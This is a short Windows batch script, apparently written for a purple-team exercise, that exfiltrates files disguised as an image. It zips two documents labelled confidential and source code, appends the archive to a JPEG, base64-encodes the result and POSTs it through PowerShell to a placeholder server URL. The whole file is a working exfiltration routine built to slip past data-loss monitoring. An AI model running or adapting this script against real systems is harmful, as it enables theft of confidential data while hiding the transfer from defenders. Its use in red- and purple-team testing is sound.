@echo off
::steg_transfer

echo Zipping files

tar -a -c -f steg.zip "D:\OneDrive - Infosys Limited\purple\Test-2-week\steg\ILMS Test Document_Confidential.doc" "D:\OneDrive - Infosys Limited\purple\Test-2-week\steg\ILMS Test Document_SourceCode.doc"

echo.

echo Hiding the Zip in the Image

copy /b infy.jpg + steg.zip steg2.jpg

echo Base64 Encoding and Making POST request

powershell -Command "& {$b = [convert]::ToBase64String((Get-Content .\steg2.jpg -Encoding byte)); Invoke-WebRequest -Uri SERVER_URL -Method POST -Body $b;}


@pause
